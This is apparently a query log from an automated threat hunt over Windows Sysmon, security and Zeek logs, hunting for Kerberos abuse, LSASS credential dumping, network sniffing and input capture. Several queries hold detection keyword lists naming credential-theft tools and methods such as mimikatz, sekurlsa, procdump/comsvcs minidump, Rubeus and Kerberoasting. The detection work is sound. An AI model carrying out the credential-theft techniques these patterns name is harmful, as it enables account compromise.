| q-e5d09fe1d8 | check C284 | search | {"dataset": "windows.other", "query": "event.code:4697 OR event.code:4657 OR event.code:3 OR event.code:22", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executa… | 2 |  |
| q-139b5de4c5 | check C285 | aggregate | {"dataset": "zeek", "field": "zeek.id_resp_h", "query": "event.action:conn AND zeek.service:smb", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 0 |  |
| q-e7958919e7 | check C286 | aggregate | {"dataset": "zeek", "field": "zeek.query", "query": "event.action:dns", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 53 |  |
| q-584a1af453 | check C287 | aggregate | {"dataset": "windows.sysmon", "field": "win.DestinationHostname", "query": "event.code:3", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 1229 |  |
| q-c2a78f6780 | check C288 | aggregate | {"dataset": "windows.sysmon", "field": "win.QueryName", "query": "event.code:22", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 81 |  |
| q-aa2a8621f3 | check C289 | aggregate | {"dataset": "windows.security", "field": "win.ProcessName", "query": "event.code:4663 OR event.code:4670 OR event.code:4656", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 10977 |  |
| q-e33b336cb1 | check C290 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE TO_LOWER(powershell.script_block_text) LIKE \"*arp*\" OR TO_LOWER(powershell.script_block_text) LIKE \"*netsh interface*\" OR TO_LOWER(powershell.script_block_text) LIKE \"*get-netne… | ERROR |  |
| q-0b6753faf9 | check C290 (repaired) | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*arp*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*netsh interface*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*get-netneighbor*\" OR TO_LOWER(win.S… | 0 |  |
| q-d877ffd3aa | check C291 | search | {"dataset": "windows.other", "query": "event.code:3 OR event.code:22 OR event.code:4663 OR event.code:4670", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executa… | 2 |  |
| q-cf4af513e4 | check C292 | aggregate | {"dataset": "zeek", "field": "zeek.orig_l2_addr", "query": "event.action:conn", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 613 |  |
| q-b95f5699bd | check C293 | aggregate | {"dataset": "zeek", "field": "zeek.resp_l2_addr", "query": "event.action:conn", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 613 |  |
| q-a5f12b3428 | check C294 | search | {"dataset": "windows.other", "query": "event.code:(1341 OR 1342 OR 1020 OR 1063)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_lin… | 0 |  |
| q-6a47e9f072 | check C295 | aggregate | {"dataset": "windows.other", "field": "event.code", "query": "*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 216 |  |
| q-fda8997011 | check C296 | search | {"dataset": "windows.security", "query": "event.code:5156 AND win.Direction:Inbound", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_… | 0 |  |
| q-70ae4bacc0 | check C297 | aggregate | {"dataset": "windows.sysmon", "field": "destination.port", "query": "event.code:3", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 1229 |  |
| q-df86251795 | check C298 | search | {"dataset": "windows.powershell", "query": "powershell.script_block_text:(*Dhcp* OR *dhcp*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.… | 0 |  |
| q-7a26837cc7 | check C299 | aggregate | {"dataset": "zeek", "field": "event.action", "query": "*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 2140 |  |
| q-b337a10227 | check C300 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4672", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 212 |  |
| q-d4f7b04c8c | check C301 | aggregate | {"dataset": "windows.security", "field": "win.LogonType", "query": "event.code:4624", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 297 |  |
| q-32ce8dbaf3 | check C302 | search | {"dataset": "windows.security", "query": "event.code:4634", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 236 |  |
| q-d18c012b3c | check C303 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 39283 |  |
| q-def54a835c | check C304 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-e4746d3532 | check C305 | search | {"dataset": "windows.powershell", "query": "powershell.script_block_text:(*kerberos* OR *Kerberos* OR *ticket* OR *Ticket*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name",… | 0 |  |
| q-1986ffde07 | check C306 | search | {"dataset": "windows.other", "query": "event.code:(7045 OR 7040)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip",… | 9 |  |
| q-fc8d58dc9f | check C307 | aggregate | {"dataset": "zeek", "field": "zeek.request_type", "query": "event.action:kerberos", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 35 |  |
| q-e5ba66aabb | check C308 | search | {"dataset": "windows.security", "query": "event.code:4769", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 28 | F50 |
| q-f4de4cd237 | check C309 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4672", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 212 |  |
| q-da70236ca6 | check C310 | aggregate | {"dataset": "windows.security", "field": "win.TicketEncryptionType", "query": "event.code:4769", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 28 |  |
| q-2d9c8b36ad | check C311 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 39283 |  |
| q-f17815849b | check C312 | search | {"dataset": "windows.powershell", "query": "powershell.script_block_text:(*golden* OR *Golden* OR *krbtgt* OR *KRBTGT*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "pr… | 0 |  |
| q-7272858bfa | check C313 | aggregate | {"dataset": "windows.other", "field": "event.code", "query": "*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 216 |  |
| q-b9f165a4fd | check C314 | aggregate | {"dataset": "zeek", "field": "zeek.request_type", "query": "event.action:kerberos", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 35 |  |
| q-62e5956c8d | check C315 | search | {"dataset": "windows.security", "query": "event.code:4769", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 28 |  |
| q-016c0baa7c | check C316 | aggregate | {"dataset": "windows.security", "field": "win.ServiceName", "query": "event.code:4769", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 28 |  |
| q-e8af6d3fc2 | check C317 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4672", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 212 |  |
| q-53fc5bc1b2 | check C318 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-c86e023923 | check C319 | search | {"dataset": "windows.powershell", "query": "powershell.script_block_text:(*silver* OR *Silver* OR *service ticket* OR *SPN*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name"… | 0 |  |
| q-ca130ec2c2 | check C320 | search | {"dataset": "windows.other", "query": "event.code:(7045 OR 7040)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip",… | 9 |  |
| q-99d214b77b | check C321 | aggregate | {"dataset": "zeek", "field": "zeek.request_type", "query": "event.action:kerberos", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 35 |  |
| q-c63ab4c187 | check C322 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4769", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 28 |  |
| q-2fea999171 | check C323 | aggregate | {"dataset": "windows.security", "field": "win.TicketEncryptionType", "query": "event.code:4769", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 28 |  |
| q-7ac77b6a70 | check C324 | search | {"dataset": "windows.security", "query": "event.code:4648", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 15 |  |
| q-c138dba540 | check C325 | aggregate | {"dataset": "windows.security", "field": "win.LogonType", "query": "event.code:4624", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 297 |  |
| q-d6069618d0 | check C326 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 39283 |  |
| q-bc31e97a57 | check C327 | search | {"dataset": "windows.powershell", "query": "powershell.script_block_text:(*Kerberoast* OR *kerberoast* OR *Invoke-Kerberoast* OR *Rubeus*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code… | 0 |  |
| q-2365bef7ad | check C328 | aggregate | {"dataset": "windows.other", "field": "event.code", "query": "*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 216 |  |
| q-10f84e312f | check C329 | aggregate | {"dataset": "zeek", "field": "zeek.request_type", "query": "event.action:kerberos", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 35 |  |
| q-8109461bde | check C330 | search | {"dataset": "windows.security", "query": "event.code:4768", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 14 |  |
| q-76a6af305c | check C331 | aggregate | {"dataset": "windows.security", "field": "win.PreAuthType", "query": "event.code:4768", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 14 |  |
| q-e3c4e37026 | check C332 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4768", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 14 |  |
| q-4226724dcd | check C333 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 447 |  |
| q-c3ae060256 | check C334 | search | {"dataset": "windows.powershell", "query": "powershell.script_block_text:(*AS-REP* OR *asrep* OR *GetNPUsers* OR *DontRequirePreAuth*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "… | 0 |  |
| q-4ca620d6c4 | check C335 | aggregate | {"dataset": "windows.other", "field": "event.code", "query": "*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 216 |  |
| q-814c99f975 | check C336 | aggregate | {"dataset": "zeek", "field": "zeek.request_type", "query": "event.action:kerberos", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 35 |  |
| q-44f1c5f434 | check C337 | aggregate | {"dataset": "windows.security", "field": "win.LogonProcessName", "query": "event.code:4624 OR event.code:4648", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 312 |  |
| q-4a79ddc263 | check C338 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-e7e3860ce5 | check C339 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*cookie* OR powershell.script_block_text:*token* OR powershell.script_block_text:*SAML*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "… | 0 |  |
| q-11e9de4119 | check C340 | search | {"dataset": "windows.other", "query": "event.code:7045 OR event.code:5857 OR event.code:5858", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process… | 90 |  |
| q-4eeb49250f | check C341 | aggregate | {"dataset": "zeek", "field": "event.action", "query": "event.action:http OR event.action:ssl OR event.action:kerberos", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 475 |  |
| q-2ff9f0b5de | check C342 | aggregate | {"dataset": "windows.sysmon", "field": "file.path", "query": "event.code:11 AND (file.path:*cookie* OR file.path:*Cookies*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 1 |  |
| q-a69a4e0f20 | check C343 | aggregate | {"dataset": "windows.security", "field": "win.LogonProcessName", "query": "event.code:4624 OR event.code:4648", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 312 |  |
| q-73a1a6c2b2 | check C344 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*cookie* OR powershell.script_block_text:*Set-Cookie* OR powershell.script_block_text:*session*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.… | 0 |  |
| q-7ae4c51704 | check C345 | search | {"dataset": "windows.other", "query": "event.code:11 OR event.code:16", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source… | 9 |  |
| q-ebac1add28 | check C346 | search | {"dataset": "zeek", "query": "event.action:http AND http.request.method:*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "so… | 62 |  |
| q-9d7b222206 | check C347 | aggregate | {"dataset": "windows.security", "field": "win.LogonProcessName", "query": "event.code:4624 OR event.code:4648", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 312 |  |
| q-61dace57a4 | check C348 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*SAML* OR powershell.script_block_text:*NotOnOrAfter* OR powershell.script_block_text:*Assertion*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "hos… | 0 |  |
| q-df8af26eb3 | check C349 | search | {"dataset": "windows.other", "query": "event.code:7045 OR event.code:5857 OR event.code:5858", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process… | 90 |  |
| q-3546311182 | check C350 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*saml* OR process.command_line:*token* OR process.command_line:*cert*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-a903906932 | check C351 | search | {"dataset": "zeek", "query": "event.action:http AND (url.original:*saml* OR url.original:*adfs* OR url.original:*token*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "p… | 0 |  |
| q-679ddd0e65 | check C352 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-e8881da974 | check C353 | aggregate | {"dataset": "windows.security", "field": "win.LogonType", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-985d482afd | check C354 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*MFA* OR powershell.script_block_text:*2FA* OR powershell.script_block_text:*Authenticator*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name… | 0 |  |
| q-a87f000ddc | check C355 | search | {"dataset": "windows.other", "query": "event.code:4625 OR event.code:5857 OR event.code:5858", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process… | 85 | F56 |
| q-5a5ad1a287 | check C356 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*login* OR process.command_line:*auth* OR process.command_line:*mfa*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-a59b0e32a2 | check C357 | search | {"dataset": "zeek", "query": "event.action:http AND (url.original:*login* OR url.original:*auth* OR url.original:*mfa*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "pr… | 0 |  |
| q-bf07165566 | check C358 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4657", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 36 |  |
| q-52b1d0eba4 | check C359 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4768", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 14 |  |
| q-a052b9a9df | check C360 | aggregate | {"dataset": "windows.sysmon", "field": "registry.path", "query": "event.code:13 AND (registry.path:*Certificate* OR registry.path:*Crypto* OR registry.path:*Keys*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 1133 |  |
| q-82028e9ddd | check C361 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*Certificate* OR powershell.script_block_text:*Export-PfxCertificate* OR powershell.script_block_text:*New-SelfSignedCertificate*)", "time_from": null, "time_to": nul… | 0 |  |
| q-e8c9d2f17d | check C362 | search | {"dataset": "windows.other", "query": "event.code:7045 OR event.code:5857 OR event.code:5858", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process… | 90 |  |
| q-1d48a82f84 | check C363 | aggregate | {"dataset": "zeek", "field": "zeek.certificate_subject", "query": "event.action:x509", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 378 |  |
| q-383d9fc8c6 | triage T1003 step 1 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9re0C"} | None | F01, F04 |
| q-1e9a29a581 | triage T1003 step 1 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9rO3D"} | None | F02 |
| q-31b1c7c74d | triage T1003 step 1 | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKA_"} | None |  |
| q-a9a5705db3 | triage T1003 step 1 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTtmJQ5"} | None | F01 |
| q-a67b1066ed | triage T1003 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == 10 AND win.TargetImage LIKE \"*lsass*\" AND win.GrantedAccess IN (\"0x1fffff\", \"0x1f3fff\", \"0x101001\", \"0x1400\", \"0x3000\", \"0x1000000\") \| KEEP @timestamp, host.… | ERROR |  |
| q-1739049d2f | triage T1003 step 2 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code IN (4656, 4663, 4670) AND win.ObjectType IN (\"SAM_DOMAIN\", \"SAM_SERVER\", \"SAM_ALIAS\") \| KEEP @timestamp, host.name, event.code, win.ObjectType, win.ObjectName, win.Pr… | ERROR |  |
| q-be3dd8cfe5 | triage T1003 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND win.TargetImage LIKE \"*lsass*\" AND win.GrantedAccess IN (\"0x1fffff\", \"0x1f3fff\", \"0x101001\", \"0x1400\", \"0x3000\", \"0x1000000\") \| KEEP @timestamp, h… | 33 |  |
| q-63b2d9c8a6 | triage T1003 step 3 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code IN (\"4656\", \"4663\", \"4670\") AND win.ObjectType IN (\"SAM_DOMAIN\", \"SAM_SERVER\", \"SAM_ALIAS\") \| KEEP @timestamp, host.name, event.code, win.ObjectType, win.Object… | 21 | F02 |
| q-50ddb88056 | triage T1003 step 4 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND (TO_LOWER(win.ScriptBlockText) LIKE \"*lsass*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*mimikatz*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*sekurlsa*\" O… | 0 |  |
| q-fd5b2915e6 | triage T1003 step 4 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"13\" AND win.TargetObject LIKE \"*SECURITY*\" \| KEEP @timestamp, host.name, process.executable, win.TargetObject, win.Details, _id, _index \| SORT @timestamp"} | 5 | F03 |
| q-8675118ea5 | triage T1003 step 5 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None | F01 |
| q-2f5e479de8 | triage T1003 step 5 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItUHCTY0"} | None | F01 |
| q-8edbd7b1cc | triage T1003 step 5 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*procdump*\" OR TO_LOWER(process.command_line) LIKE \"*comsvcs*\" OR TO_LOWER(process.command_line) LIKE \"*minidump*\" OR … | 0 |  |
| q-5091819394 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-9cb817eccf | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-8cd46b025f | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItUHCTY0"} | None |  |
| q-3b18ec7ad3 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItUHCTY0"} | None |  |
| q-112d5db549 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTtmJQ5"} | None |  |
| q-38860057e0 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9re0C"} | None |  |
| q-eda7542965 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTiZblD"} | None |  |
| q-f540c9c062 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9rO3D"} | None |  |
| q-ea60551878 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9rO3D"} | None |  |
| q-88a680dfc0 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn0lP6"} | None |  |
| q-46db8a10c0 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn0lP6"} | None |  |
| q-d0b327b197 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn0lPQ"} | None |  |
| q-6f5adc3fe3 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItKT-FUX"} | None |  |
| q-ead5dfe5d5 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVGQnT"} | None |  |
| q-c8128a7bc2 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVGQnT"} | None |  |
| q-0f8a643ba7 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOpVKlK"} | None |  |
| q-ff11a61f26 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9re0C"} | None |  |
| q-8675aa1987 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItThYN7M"} | None |  |
| q-b45c9feaf8 | triage T1040 step 1 | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrX8TL"} | None |  |
| q-604d8a0354 | triage T1040 step 1 | search | {"dataset": "windows.security", "query": "event.code:4688 AND (process.executable:*NetworkWatcher* OR process.executable:*psexec* OR process.executable:*PsExec* OR process.executable:*sdelete* OR process.executable:*python*)", "time_from": null, "time_to": nul… | 19 | F06 |
| q-2cd1a50461 | triage T1040 step 2 | search | {"dataset": "windows.security", "query": "event.code:4688 AND process.executable:*NetworkWatcher*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "process.executable", "process.command_line", "process.parent.executable"… | 4 | F05 |
| q-3fc7911749 | triage T1040 step 2 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*pcap* OR process.command_line:*sniff* OR process.command_line:*promisc* OR process.command_line:*NetworkWatcher* OR process.command_line:*capture*)", "time_from": null, "time_to": … | 6 |  |
| q-cd4089490f | triage T1040 step 3 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPM8kte"} | None | F05 |
| q-114bfd4ab2 | triage T1040 step 3 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*netsh* OR win.ScriptBlockText:*capture* OR win.ScriptBlockText:*NetworkWatcher* OR win.ScriptBlockText:*trace*)", "time_from": null, "time_to": null, "fields": ["@timestamp",… | 0 |  |
| q-ae3e31304d | triage T1040 step 4 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND (win.TargetFilename:*pcap* OR win.TargetFilename:*.etl OR win.TargetFilename:*capture* OR win.TargetFilename:*python*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.n… | 41 |  |
| q-19ebf75726 | triage T1040 step 4 | search | {"dataset": "windows.sysmon", "query": "event.code:3 AND process.executable:*python*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "process.executable", "process.command_line", "win.Image", "win.DestinationIp", "win.D… | 348 | F06 |
| q-6b52046f21 | triage T1040 step 5 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND process.executable:*netsh*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "process.executable", "process.command_line", "win.Image"], "size": 30, "sort": "asc"} | 2 | F05 |
| q-329823c7c6 | triage T1040 step 5 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*raw* OR process.command_line:*promisc* OR process.command_line:*windump* OR process.command_line:*tcpdump* OR process.command_line:*dumpcap*)", "time_from": null, "time_to": null, … | 1 | F06 |
| q-1c8914f9b4 | triage T1040 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPM8kte"} | None |  |
| q-5137533cb6 | triage T1040 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPM8kte"} | None |  |
| q-a75dcc6e40 | triage T1040 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPE0PdZ"} | None |  |
| q-42b09492f5 | triage T1040 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn1FOC"} | None |  |
| q-6355835b93 | triage T1040 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-cd3e37d4af | triage T1040 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev9A"} | None |  |
| q-c97fc2e297 | triage T1040 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPK66ha"} | None |  |
| q-5ab3fda0be | triage T1056 step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass* AND NOT win.GrantedAccess:0x1000 AND NOT win.GrantedAccess:0x1400", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "process.executable", "process.comma… | 9 | F07, F10 |
| q-d1f4704a27 | triage T1056 step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.SourceImage:*powershell* AND (win.TargetImage:*lsass* OR win.TargetImage:*winlogon*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "process.executable", "process.comman… | 6 |  |
| q-94bdca322d | triage T1056 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-54bd480bb5 | triage T1056 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
